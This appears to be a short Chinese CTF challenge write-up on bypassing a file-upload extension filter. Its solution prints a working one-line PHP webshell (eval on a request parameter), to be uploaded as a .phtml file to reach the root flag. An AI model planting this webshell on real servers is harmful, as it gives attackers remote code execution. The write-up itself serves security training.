- 出题人: xidaner
- 难度: 简单
- 考点: 文件上传后缀绕过
- 解法:

    爆破文件上传后缀名，查看是否存在可上传的文件后缀名, 是否会使用一句话连接目标。上传 phtml 一句话马连接即可。
    ```php
    <script language="php">eval($_REQUEST[shell])</script>
    ```
- flag: flag 在根目录 flag.txt
- 注意点: 无